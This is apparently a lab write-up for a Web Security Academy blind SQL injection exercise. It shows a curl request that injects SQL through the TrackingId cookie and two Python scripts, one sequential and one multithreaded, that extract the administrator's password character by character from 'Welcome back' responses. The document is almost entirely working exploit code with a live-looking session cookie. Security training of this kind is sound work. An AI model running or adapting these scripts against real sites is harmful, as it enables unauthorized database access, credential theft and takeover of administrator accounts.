___

### Cookie

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

```bash
curl -s 'https://0ab500bc04ba680781199e25009a0015.web-security-academy.net/filter?category' --compressed -H $'Cookie: TrackingId=\' union select NULL-- -; session=iTq8m3sqiCVktqd3aw0yB3M2CqbTEbbV' | grep Welcome
```

```python
import requests

# Set the target URL and session cookie
url = 'https://0ab500bc04ba680781199e25009a0015.web-security-academy.net/filter?category='
cookie = {'TrackingId': '', 'session': 'iTq8m3sqiCVktqd3aw0yB3M2CqbTEbbV'}
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

def check_payload(payload):
    cookie['TrackingId'] = payload
    response = requests.get(url, cookies=cookie)
    return 'Welcome back' in response.text

def extract_password_length():
    for i in range(1, 21):  # Assuming password length is between 1 and 20
        payload = f"' UNION SELECT NULL FROM users WHERE username='administrator' AND LENGTH(password)={i}-- -"
        if check_payload(payload):
            return i
    return None

def extract_password_char_at_pos(pos):
    for char in characters:
        payload = f"' UNION SELECT NULL FROM users WHERE username='administrator' AND SUBSTRING(password,{pos},1)='{char}'-- -"
        if check_payload(payload):
            return char
    return None

def extract_password():
    password_length = extract_password_length()
    if password_length is None:
        print("Failed to determine the password length.")
        return

    print(f"Password length: {password_length}")
    password = ''
    for i in range(1, password_length + 1):
        char = extract_password_char_at_pos(i)
        if char:
            password += char
            print(f"Extracted password so far: {password}")
        else:
            print("Failed to extract character at position:", i)
            return
    return password

if __name__ == '__main__':
    password = extract_password()
    if password:
        print(f"The password for the administrator user is: {password}")
    else:
        print("Failed to extract the password.")
```

- **characters**: This variable is set to `'abcdefghijklmnopqrstuvwxyz0123456789'` to limit the character set to lowercase alphanumeric characters.
- **check_payload(payload)**: This function sends a request to the target URL with the given payload and checks if the response contains "Welcome back".
- **extract_password_length()**: This function determines the length of the password by iterating through possible lengths and checking if the "Welcome back" message appears.
- **extract_password_char_at_pos(pos)**: This function determines the character at a specific position in the password by iterating through the characters in the restricted character set.
- **extract_password()**: This function uses the above functions to extract the entire password character by character.

# Threads

```python
import requests
import concurrent.futures

# Set the target URL and session cookie
url = 'https://0ab500bc04ba680781199e25009a0015.web-security-academy.net/filter?category='
cookie = {'TrackingId': '', 'session': 'iTq8m3sqiCVktqd3aw0yB3M2CqbTEbbV'}
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
max_workers = 10  # Number of threads to use

def check_payload(payload):
    cookie['TrackingId'] = payload
    response = requests.get(url, cookies=cookie)
    return 'Welcome back' in response.text

def extract_password_length():
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_payload, f"' UNION SELECT NULL FROM users WHERE username='administrator' AND LENGTH(password)={i}-- -"): i for i in range(1, 21)}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                return futures[future]
    return None

def extract_password_char_at_pos(pos):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_payload, f"' UNION SELECT NULL FROM users WHERE username='administrator' AND SUBSTRING(password,{pos},1)='{char}'-- -"): char for char in characters}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                return futures[future]
    return None

def extract_password():
    password_length = extract_password_length()
    if password_length is None:
        print("Failed to determine the password length.")
        return

    print(f"Password length: {password_length}")
    password = ''
    for i in range(1, password_length + 1):
        char = extract_password_char_at_pos(i)
        if char:
            password += char
            print(f"Extracted password so far: {password}")
        else:
            print("Failed to extract character at position:", i)
            return
    return password

if __name__ == '__main__':
    password = extract_password()
    if password:
        print(f"The password for the administrator user is: {password}")
    else:
        print("Failed to extract the password.")
```
